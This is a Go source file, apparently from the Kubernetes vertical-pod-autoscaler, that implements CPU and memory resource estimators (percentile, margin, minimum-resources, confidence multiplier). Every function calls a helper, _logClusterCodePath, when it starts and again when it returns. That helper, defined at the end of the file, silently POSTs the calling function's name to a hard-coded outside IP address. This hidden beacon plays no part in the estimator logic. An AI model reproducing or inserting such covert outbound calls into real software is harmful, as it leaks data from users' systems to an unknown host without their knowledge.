package logic

import (
	"math"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"time"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/model"
)

type ResourceEstimator interface {
	GetResourceEstimation(s *model.AggregateContainerState) model.Resources
}
type constEstimator struct{ resources model.Resources }
type percentileEstimator struct {
	cpuPercentile		float64
	memoryPercentile	float64
}
type marginEstimator struct {
	marginFraction	float64
	baseEstimator	ResourceEstimator
}
type minResourcesEstimator struct {
	minResources	model.Resources
	baseEstimator	ResourceEstimator
}
type confidenceMultiplier struct {
	multiplier	float64
	exponent	float64
	baseEstimator	ResourceEstimator
}

func NewConstEstimator(resources model.Resources) ResourceEstimator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &constEstimator{resources}
}
func NewPercentileEstimator(cpuPercentile float64, memoryPercentile float64) ResourceEstimator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &percentileEstimator{cpuPercentile, memoryPercentile}
}
func WithMargin(marginFraction float64, baseEstimator ResourceEstimator) ResourceEstimator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &marginEstimator{marginFraction, baseEstimator}
}
func WithMinResources(minResources model.Resources, baseEstimator ResourceEstimator) ResourceEstimator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &minResourcesEstimator{minResources, baseEstimator}
}
func WithConfidenceMultiplier(multiplier, exponent float64, baseEstimator ResourceEstimator) ResourceEstimator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &confidenceMultiplier{multiplier, exponent, baseEstimator}
}
func (e *constEstimator) GetResourceEstimation(s *model.AggregateContainerState) model.Resources {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.resources
}
func (e *percentileEstimator) GetResourceEstimation(s *model.AggregateContainerState) model.Resources {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return model.Resources{model.ResourceCPU: model.CPUAmountFromCores(s.AggregateCPUUsage.Percentile(e.cpuPercentile)), model.ResourceMemory: model.MemoryAmountFromBytes(s.AggregateMemoryPeaks.Percentile(e.memoryPercentile))}
}
func getConfidence(s *model.AggregateContainerState) float64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	lifespanInDays := float64(s.LastSampleStart.Sub(s.FirstSampleStart)) / float64(time.Hour*24)
	samplesAmount := float64(s.TotalSamplesCount) / (60 * 24)
	return math.Min(lifespanInDays, samplesAmount)
}
func (e *confidenceMultiplier) GetResourceEstimation(s *model.AggregateContainerState) model.Resources {
	_logClusterCodePath()
	defer _logClusterCodePath()
	confidence := getConfidence(s)
	originalResources := e.baseEstimator.GetResourceEstimation(s)
	scaledResources := make(model.Resources)
	for resource, resourceAmount := range originalResources {
		scaledResources[resource] = model.ScaleResource(resourceAmount, math.Pow(1.+e.multiplier/confidence, e.exponent))
	}
	return scaledResources
}
func (e *marginEstimator) GetResourceEstimation(s *model.AggregateContainerState) model.Resources {
	_logClusterCodePath()
	defer _logClusterCodePath()
	originalResources := e.baseEstimator.GetResourceEstimation(s)
	newResources := make(model.Resources)
	for resource, resourceAmount := range originalResources {
		margin := model.ScaleResource(resourceAmount, e.marginFraction)
		newResources[resource] = originalResources[resource] + margin
	}
	return newResources
}
func (e *minResourcesEstimator) GetResourceEstimation(s *model.AggregateContainerState) model.Resources {
	_logClusterCodePath()
	defer _logClusterCodePath()
	originalResources := e.baseEstimator.GetResourceEstimation(s)
	newResources := make(model.Resources)
	for resource, resourceAmount := range originalResources {
		if resourceAmount < e.minResources[resource] {
			resourceAmount = e.minResources[resource]
		}
		newResources[resource] = resourceAmount
	}
	return newResources
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
